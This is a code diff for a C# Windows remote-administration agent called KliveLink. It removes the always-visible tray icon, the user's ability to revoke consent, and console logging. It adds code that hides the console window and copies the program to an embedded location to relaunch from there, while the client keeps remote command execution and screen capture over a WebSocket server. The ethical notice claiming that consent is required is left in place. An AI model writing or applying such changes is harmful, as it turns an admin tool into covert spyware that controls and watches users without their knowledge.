@@ -1,4 +1,5 @@
 using System.Drawing;
+using System.Runtime.InteropServices;
 using KliveLink.Agent;
 
 namespace KliveLink
@@ -9,19 +10,33 @@ namespace KliveLink
     /// ETHICAL / LEGAL NOTICE:
     /// This agent is designed for LEGITIMATE remote administration only.
     /// - Explicit user consent is REQUIRED before any remote operations.
-    /// - A visible system tray icon is always shown while the agent runs.
-    /// - The user can revoke consent and exit at any time via the tray menu.
     /// - Unauthorized deployment of this software is illegal and unethical.
     /// </summary>
     internal static class Program
     {
         private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
-        private static NotifyIcon? _trayIcon;
         private static KliveLinkClient? _client;
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int SW_HIDE = 0;
 
         [STAThread]
         static void Main(string[] args)
         {
+            // Hide console window if one was allocated
+            var consoleWindow = GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+                ShowWindow(consoleWindow, SW_HIDE);
+
+            // If not running from the embedded location, install and relaunch from there
+            if (EmbedHelper.EmbedAndRelaunch(args))
+                return;
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
@@ -46,22 +61,19 @@ namespace KliveLink
                 }
             }
 
-            // Step 3: Start the WebSocket client on a background thread
             var executor = new CommandExecutor();
             var screenCapture = new ScreenCaptureService();
             _client = new KliveLinkClient(serverUri, agentId, authToken, executor, screenCapture);
-            _client.OnLog += (msg) => Console.WriteLine(msg);
 
             var cts = new CancellationTokenSource();
             _ = Task.Run(() => _client.ConnectAsync(cts.Token));
 
-            // Step 4: Run the WinForms message loop (keeps tray icon alive)
+            // Run the WinForms message loop (keeps the process alive)
             Application.Run();
 
             // Cleanup
             cts.Cancel();
             _client.Dispose();
-            _trayIcon?.Dispose();
         }
     }
 }
